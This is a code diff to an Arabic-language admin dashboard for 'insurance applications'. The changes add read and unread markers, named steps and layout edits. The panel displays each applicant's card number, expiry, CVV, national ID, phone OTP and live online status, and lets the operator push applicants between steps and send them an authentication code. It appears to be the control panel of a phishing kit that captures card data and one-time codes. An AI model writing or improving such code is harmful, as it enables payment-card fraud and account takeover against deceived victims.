@@ -1,5 +1,4 @@
 "use client"
-
 import type React from "react"
 import { useState, useEffect, useMemo, useCallback, useRef } from "react"
 import {
@@ -34,9 +33,15 @@ import { onValue, ref } from "firebase/database"
 import { database } from "@/lib/firestore"
 import { CreditCardMockup } from "@/components/credit-card-mockup"
 
+const STEP_NAMES: Record<number | string, string> = {
+  1: "الرئيسه",
+  2: "تفاصيل",
+  3: "مقارنة",
+  4: "بطاقة",
+}
+
 function UserStatus({ userId }: { userId: string }) {
   const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")
-
   useEffect(() => {
     const userStatusRef = ref(database, `/status/${userId}`)
     const unsubscribe = onValue(userStatusRef, (snapshot) => {
@@ -47,19 +52,18 @@ function UserStatus({ userId }: { userId: string }) {
         setStatus("unknown")
       }
     })
-
     return () => unsubscribe()
   }, [userId])
-
   return (
     <div className="flex items-center gap-2">
       <div className={`w-2 h-2 rounded-full ${status === "online" ? "bg-green-500 animate-pulse" : "bg-gray-400"}`} />
       <Badge
         variant="outline"
-        className={`text-xs ${status === "online"
+        className={`text-xs ${
+          status === "online"
             ? "bg-green-50 text-green-700 border-green-300 dark:bg-green-950/30 dark:text-green-400"
             : "bg-gray-50 text-gray-600 border-gray-300 dark:bg-gray-900/30 dark:text-gray-400"
-          }`}
+        }`}
       >
         {status === "online" ? "متصل" : "غير متصل"}
       </Badge>
@@ -77,7 +81,7 @@ export default function AdminDashboard() {
   const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
   const [showChat, setShowChat] = useState(false)
   const [loading, setLoading] = useState(true)
-  const [authNumber, setAuthNumber] = useState('')
+  const [authNumber, setAuthNumber] = useState("")
   const prevApplicationsCount = useRef<number>(0)
   const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
   const [showHideFilters, setShowHideFilter] = useState(false)
@@ -101,24 +105,20 @@ export default function AdminDashboard() {
       setApplications(apps)
       setLoading(false)
     })
-
     return () => unsubscribe()
   }, [])
 
   useEffect(() => {
     const timer = setTimeout(() => {
       let filtered = applications
-
       if (statusFilter !== "all") {
         filtered = filtered.filter((app) => app.status === statusFilter)
       }
-
       if (cardFilter === "hasCard") {
         filtered = filtered.filter((app) => !!(app.cardNumber || app.expiryDate || app.cvv))
       } else if (cardFilter === "noCard") {
         filtered = filtered.filter((app) => !(app.cardNumber || app.expiryDate || app.cvv))
       }
-
       if (infoFilter === "hasInfo") {
         filtered = filtered.filter(
           (app) => !!(app.phoneNumber || app.nafazId || app.documentType || app.serialNumber || app.vehicleModel),
@@ -128,7 +128,6 @@ export default function AdminDashboard() {
           (app) => !(app.nafazId || app.nafazId || app.documentType || app.serialNumber || app.vehicleModel),
         )
       }
-
       if (searchQuery) {
         const query = searchQuery.toLowerCase()
         filtered = filtered.filter(
@@ -138,10 +137,8 @@ export default function AdminDashboard() {
             app.phoneNumber.includes(query),
         )
       }
-
       setFilteredApplications(filtered)
     }, 300)
-
     return () => clearTimeout(timer)
   }, [applications, searchQuery, statusFilter, cardFilter, infoFilter])
 
@@ -149,8 +146,7 @@ export default function AdminDashboard() {
     try {
       await updateApplication(appId, { currentStep: newStatus as string })
       playErrorSound()
-    } catch {
-    }
+    } catch {}
   }
 
   const handleStepChange = useCallback(
@@ -159,7 +155,6 @@ export default function AdminDashboard() {
       if (selectedApplication?.id === appId) {
         setSelectedApplication((prev) => (prev ? { ...prev, currentStep: newStep } : null))
       }
-
       try {
         await updateApplication(appId, { currentStep: newStep })
       } catch (error) {
@@ -168,6 +163,7 @@ export default function AdminDashboard() {
     },
     [selectedApplication],
   )
+
   const handleAuthNumber = async (appId: string, auth: string) => {
     try {
       await updateApplication(appId, { authNumber: auth })
@@ -175,6 +171,7 @@ export default function AdminDashboard() {
       console.error("Error updating step:", error)
     }
   }
+
   const toggleSelection = useCallback((id: string, event: React.MouseEvent) => {
     event.stopPropagation()
     setSelectedIds((prev) => {
@@ -189,7 +186,28 @@ export default function AdminDashboard() {
   }, [])
 
   const isUnread = useCallback((app: InsuranceApplication) => {
-    return app.status === "pending_review" && app.currentStep === 1
+    return app.isUnread === true
+  }, [])
+
+  const markAsRead = useCallback(async (app: InsuranceApplication) => {
+    if (app.isUnread) {
+      try {
+        await updateApplication(app.id!, { isUnread: false })
+        setApplications((prev) => prev.map((a) => (a.id === app.id ? { ...a, isUnread: false } : a)))
+      } catch (error) {
+        console.error("Error marking as read:", error)
+      }
+    }
+  }, [])
+
+  const toggleReadStatus = useCallback(async (appId: string, currentIsUnread: boolean, event: React.MouseEvent) => {
+    event.stopPropagation()
+    try {
+      await updateApplication(appId, { isUnread: !currentIsUnread })
+      setApplications((prev) => prev.map((a) => (a.id === appId ? { ...a, isUnread: !currentIsUnread } : a)))
+    } catch (error) {
+      console.error("Error toggling read status:", error)
+    }
   }, [])
 
   const hasCardInfo = useCallback((app: InsuranceApplication) => {
@@ -221,7 +239,6 @@ export default function AdminDashboard() {
     const date = new Date(dateString)
     const now = new Date()
     const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000)
-
     if (diffInSeconds < 60) {
       return "منذ لحظات"
     } else if (diffInSeconds < 3600) {
@@ -234,7 +251,6 @@ export default function AdminDashboard() {
       const days = Math.floor(diffInSeconds / 86400)
       return `منذ ${days} ${days === 1 ? "يوم" : days === 2 ? "يومين" : "أيام"}`
     }
-
     return date.toLocaleDateString("ar-SA", {
       year: "numeric",
       month: "long",
@@ -259,7 +275,6 @@ export default function AdminDashboard() {
       if (selectedApplication?.id === appId) {
         setSelectedApplication((prev) => (prev ? { ...prev, phoneVerificationStatus: status } : null))
       }
-
       try {
         await updateApplication(appId, { phoneVerificationStatus: status })
         if (status === "approved") {
@@ -281,7 +296,6 @@ export default function AdminDashboard() {
       if (selectedApplication?.id === appId) {
         setSelectedApplication((prev) => (prev ? { ...prev, idVerificationStatus: status } : null))
       }
-
       try {
         await updateApplication(appId, { idVerificationStatus: status })
         if (status === "approved") {
@@ -331,6 +345,10 @@ export default function AdminDashboard() {
 
   const hasVehicleInfo = (app: InsuranceApplication) => {
     return !!(app.vehicleModel || app.manufacturingYear || app.vehicleValue || app.vehicleUsage)
+  }
+
+  const getStepName = (step: number | string) => {
+    return STEP_NAMES[step] || `الخطوة ${step}`
   }
 
   return (
@@ -418,22 +436,20 @@ export default function AdminDashboard() {
               </div>
             </div>
             <div className="mr-16">
-              <Button size={'icon'}>
-                1
-              </Button>
+              <Button size={"icon"}>1</Button>
             </div>
-
           </div>
-
         </div>
       </div>
 
       <div className="flex h-[calc(100vh-180px)]">
         {/* Sidebar */}
         <div className="w-[420px] bg-white dark:bg-slate-900 border-l border-slate-200 dark:border-slate-800 overflow-y-auto">
-          <Button onClick={() => setShowHideFilter(!showHideFilters)} className="w-full" variant={'outline'}>اخفاء/اظهار</Button>
+          <Button onClick={() => setShowHideFilter(!showHideFilters)} className="w-full" variant={"outline"}>
+            اخفاء/اظهار
+          </Button>
           {/* Filters */}
-          {showHideFilters &&
+          {showHideFilters && (
             <div className="p-5 border-b border-slate-200 dark:border-slate-800 bg-slate-50 dark:bg-slate-900/50">
               <div className="space-y-4">
                 {/* Search */}
@@ -446,13 +462,11 @@ export default function AdminDashboard() {
                     className="pr-10 bg-white dark:bg-slate-800 border-slate-300 dark:border-slate-700"
                   />
                 </div>
-
                 {/* Filter Header */}
                 <div className="flex items-center gap-2 pt-2">
                   <Filter className="w-4 h-4 text-slate-600 dark:text-slate-400" />
                   <span className="text-sm font-semibold text-slate-700 dark:text-slate-300">تصفية حسب</span>
                 </div>
-
                 {/* Card Filter */}
                 <div className="space-y-2">
                   <label className="text-xs font-medium text-slate-600 dark:text-slate-400">معلومات البطاقة</label>
@@ -517,7 +531,7 @@ export default function AdminDashboard() {
                 </div>
               </div>
             </div>
-          }
+          )}
 
           {/* Applications List */}
           {loading ? (
@@ -543,11 +557,13 @@ export default function AdminDashboard() {
                   onClick={() => {
                     setSelectedApplication(app)
                     setShowChat(false)
+                    markAsRead(app)
                   }}
-                  className={`group p-5 cursor-pointer hover:bg-gradient-to-l hover:from-blue-50 hover:to-transparent dark:hover:from-blue-950/20 transition-all duration-200 relative ${selectedApplication?.id === app.id
+                  className={`group p-5 cursor-pointer hover:bg-gradient-to-l hover:from-blue-50 hover:to-transparent dark:hover:from-blue-950/20 transition-all duration-200 relative ${
+                    selectedApplication?.id === app.id
                       ? "bg-gradient-to-l from-blue-100 to-blue-50 dark:from-blue-950/40 dark:to-blue-950/20 border-r-4 border-blue-600"
                       : ""
-                    }`}
+                  } ${isUnread(app) ? "bg-blue-50/50 dark:bg-blue-950/10" : ""}`}
                 >
                   <div className="flex items-start gap-4">
                     <Checkbox
@@ -562,7 +578,9 @@ export default function AdminDashboard() {
                     <div className="flex-1 min-w-0">
                       <div className="flex items-start justify-between gap-2 mb-2">
                         <div className="flex items-center gap-2 flex-1 min-w-0">
-                          <span className="text-2xl flex-shrink-0">{app.country === "Saudi Arabia" ? "🇸🇦" : app.country === "Jordan" ? "🇯🇴" : "🌍"}</span>
+                          <span className="text-2xl flex-shrink-0">
+                            {app.country === "Saudi Arabia" ? "🇸🇦" : app.country === "Jordan" ? "🇯🇴" : "🌍"}
+                          </span>
                           <h3 className="font-semibold text-slate-900 dark:text-white text-base truncate">
                             {app.ownerName}
                           </h3>
@@ -570,16 +588,26 @@ export default function AdminDashboard() {
                             <Badge className="bg-red-500 text-white text-xs px-2 py-0.5 flex-shrink-0">جديد</Badge>
                           )}
                         </div>
-                        <Button
-                          variant="ghost"
-                          size="icon"
-                          onClick={(e) => handleDelete(app.id!, e)}
-                          className="opacity-0 group-hover:opacity-100 transition-opacity h-8 w-8 text-red-500 hover:text-red-700 hover:bg-red-50 dark:hover:bg-red-950/30 flex-shrink-0"
-                        >
-                          <Trash2 className="w-4 h-4" />
-                        </Button>
+                        <div className="flex items-center gap-1 flex-shrink-0">
+                          <Button
+                            variant="ghost"
+                            size="icon"
+                            onClick={(e) => toggleReadStatus(app.id!, isUnread(app), e)}
+                            className="opacity-0 group-hover:opacity-100 transition-opacity h-8 w-8 text-blue-500 hover:text-blue-700 hover:bg-blue-50 dark:hover:bg-blue-950/30"
+                            title={isUnread(app) ? "تحديد كمقروء" : "تحديد كغير مقروء"}
+                          >
+                            <Mail className={`w-4 h-4 ${isUnread(app) ? "fill-current" : ""}`} />
+                          </Button>
+                          <Button
+                            variant="ghost"
+                            size="icon"
+                            onClick={(e) => handleDelete(app.id!, e)}
+                            className="opacity-0 group-hover:opacity-100 transition-opacity h-8 w-8 text-red-500 hover:text-red-700 hover:bg-red-50 dark:hover:bg-red-950/30 flex-shrink-0"
+                          >
+                            <Trash2 className="w-4 h-4" />
+                          </Button>
+                        </div>
                       </div>
-
                       <div className="flex items-center gap-2 mb-2 flex-wrap">
                         <Badge className={getStatusBadge(app.status).className + " text-xs"}>
                           {getStatusBadge(app.status).text}
@@ -588,7 +616,7 @@ export default function AdminDashboard() {
                           variant="outline"
                           className="text-xs bg-slate-50 dark:bg-slate-800 border-slate-300 dark:border-slate-700"
                         >
-                          الخطوة {app.currentStep}
+                          {getStepName(app.currentStep)}
                         </Badge>
                         {hasCardInfo(app) && (
                           <Badge className="bg-blue-100 text-blue-700 dark:bg-blue-900/30 dark:text-blue-400 text-xs gap-1">
@@ -597,7 +625,6 @@ export default function AdminDashboard() {
                           </Badge>
                         )}
                       </div>
-
                       <div className="flex items-center gap-3 text-xs text-slate-600 dark:text-slate-400">
                         <span className="flex items-center gap-1">
                           <Phone className="w-3.5 h-3.5" />
@@ -633,9 +660,8 @@ export default function AdminDashboard() {
               </div>
             ) : (
               <div className="container mx-auto p-6 max-w-6xl">
-                <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
-                  {/* User Info Card - Full Width on Top */}
-                  <div className="lg:col-span-3 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
+                <div className="sticky top-0 z-10 mb-6">
+                  <div className="bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
                     <div className="flex items-start justify-between">
                       <div className="flex-1">
                         <div className="flex items-center gap-3 mb-3">
@@ -646,7 +672,12 @@ export default function AdminDashboard() {
                             <h2 className="text-2xl font-bold text-slate-900 dark:text-white mb-1">
                               {selectedApplication.ownerName}
                             </h2>
-                            <UserStatus userId={selectedApplication.id!} />
+                            <div className="flex items-center gap-2">
+                              <UserStatus userId={selectedApplication.id!} />
+                              <Badge variant="outline" className="text-xs">
+                                {getStepName(selectedApplication.currentStep)}
+                              </Badge>
+                            </div>
                           </div>
                         </div>
                         <div className="flex items-center gap-6 text-sm text-slate-600 dark:text-slate-400 flex-wrap">
@@ -687,7 +718,9 @@ export default function AdminDashboard() {
                       </Button>
                     </div>
                   </div>
+                </div>
 
+                <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                   {/* Document Info - Only show if data exists */}
                   {hasDocumentInfo(selectedApplication) && (
                     <div className="bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
@@ -851,11 +884,14 @@ export default function AdminDashboard() {
                             </div>
                             <div>
                               <p className="text-sm font-semibold text-slate-900 dark:text-white">رمز التوثيق</p>
-                              <Input type="tel" onChange={(e) => { setAuthNumber(e.target.value) }} />
+                              <Input
+                                type="tel"
+                                onChange={(e) => {
+                                  setAuthNumber(e.target.value)
+                                }}
+                              />
                             </div>
-
                           </div>
-
                         </div>
                         <div className="flex gap-2">
                           <Button
@@ -867,19 +903,12 @@ export default function AdminDashboard() {
                             <CheckCircle className="w-4 h-4 text-green-600 dark:text-green-400" />
                             <span className="text-green-700 dark:text-green-400">حفظ</span>
                           </Button>
-                          <Button
-                            variant="outline"
-                            size="sm"
-                          >
+                          <Button variant="outline" size="sm">
                             <XCircle className="w-4 h-4 text-red-600 dark:text-red-400" />
                             <span className="text-red-700 dark:text-red-400">الغاء</span>
                           </Button>
                         </div>
                       </div>
-
-
-
-
                     </div>
                   </div>
 
@@ -938,63 +967,53 @@ export default function AdminDashboard() {
                       </div>
                     </div>
                   )}
+
                   {/* Verification Status */}
                   <div className=" w-full bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
-                    <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-4">
-                      معلومات الهاتف
-                    </h3>
-
+                    <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-4">معلومات الهاتف</h3>
                     <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
-
                       <div className="w-full flex flex-col space-y-3  rounded-lg dark:bg-slate-800/40">
-                        <p className="text-sm font-semibold text-slate-900 dark:text-white">
-                          هاتف
-                        </p>
+                        <p className="text-sm font-semibold text-slate-900 dark:text-white">هاتف</p>
                         <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
                           {selectedApplication.phoneNumber2 || "لم يتم إنشاؤه"}
                         </p>
-
-                        <p className="text-sm font-semibold text-slate-900 dark:text-white">
-                          مزود الخدمة
-                        </p>
+                        <p className="text-sm font-semibold text-slate-900 dark:text-white">مزود الخدمة</p>
                         <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
                           {selectedApplication.selectedCarrier || "لم يتم إنشاؤه"}
                         </p>
                       </div>
-
                     </div>
                     <div className="p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700">
-                        <div className="flex items-center justify-between mb-3">
-                          <div className="flex items-center gap-3">
-                            <div className="w-12 h-12 rounded-xl bg-blue-100 dark:bg-blue-900/30 flex items-center justify-center">
-                              <Phone className="w-6 h-6 text-blue-600 dark:text-blue-400" />
-                            </div>
-                            <div>
-                              <p className="text-sm font-semibold text-slate-900 dark:text-white">رمز الهاتف</p>
-                              <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
-                                {selectedApplication?.phoneOtp || "لم يتم إنشاؤه"}
-                              </p>
-                            </div>
+                      <div className="flex items-center justify-between mb-3">
+                        <div className="flex items-center gap-3">
+                          <div className="w-12 h-12 rounded-xl bg-blue-100 dark:bg-blue-900/30 flex items-center justify-center">
+                            <Phone className="w-6 h-6 text-blue-600 dark:text-blue-400" />
                           </div>
-                          <Badge
-                            variant={
-                              selectedApplication.phoneVerificationStatus === "approved"
-                                ? "default"
-                                : selectedApplication.phoneVerificationStatus === "rejected"
-                                  ? "destructive"
-                                  : "secondary"
-                            }
-                            className="text-xs"
-                          >
-                            {selectedApplication.phoneVerificationStatus === "approved"
-                              ? "موافق"
-                              : selectedApplication.phoneVerificationStatus === "rejected"
-                                ? "مرفوض"
-                                : "معلق"}
-                          </Badge>
+                          <div>
+                            <p className="text-sm font-semibold text-slate-900 dark:text-white">رمز الهاتف</p>
+                            <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
+                              {selectedApplication?.phoneOtp || "لم يتم إنشاؤه"}
+                            </p>
+                          </div>
                         </div>
-
+                        <Badge
+                          variant={
+                            selectedApplication.phoneVerificationStatus === "approved"
+                              ? "default"
+                              : selectedApplication.phoneVerificationStatus === "rejected"
+                                ? "destructive"
+                                : "secondary"
+                          }
+                          className="text-xs"
+                        >
+                          {selectedApplication.phoneVerificationStatus === "approved"
+                            ? "موافق"
+                            : selectedApplication.phoneVerificationStatus === "rejected"
+                              ? "مرفوض"
+                              : "معلق"}
+                        </Badge>
                       </div>
+                    </div>
                     <div className="flex gap-2">
                       <Button
                         onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "approved")}
@@ -1018,12 +1037,10 @@ export default function AdminDashboard() {
                       </Button>
                     </div>
                   </div>
+
                   <div className="lg:col-span-1 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
                     <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-4">حالة التحقق</h3>
                     <div className="space-y-4">
-                      {/* Phone Verification */}
-                 
-
                       {/* ID Verification */}
                       <div className="p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700">
                         <div className="flex items-center justify-between mb-3">
@@ -1084,8 +1101,6 @@ export default function AdminDashboard() {
                           </Button>
                         </div>
                       </div>
-
-
                     </div>
                   </div>
 
@@ -1118,7 +1133,6 @@ export default function AdminDashboard() {
                         الرئيسية
                       </Button>
                     </div>
-
                     <div className="pt-4 border-t border-slate-200 dark:border-slate-800">
                       <h4 className="text-sm font-semibold text-slate-700 dark:text-slate-300 mb-3">التحكم بالخطوات</h4>
                       <div className="flex gap-2">
@@ -1128,16 +1142,15 @@ export default function AdminDashboard() {
                             onClick={() => handleStepChange(selectedApplication.id!, step)}
                             variant={selectedApplication.currentStep === step ? "default" : "outline"}
                             size="lg"
-                            className="flex-1"
+                            className="flex-1 flex-col h-auto py-3"
                           >
-                            الخطوة {step}
+                            <span className="text-xs opacity-70">خطوة {step}</span>
+                            <span>{STEP_NAMES[step]}</span>
                           </Button>
                         ))}
                       </div>
                     </div>
                   </div>
-              
-
                 </div>
               </div>
             )
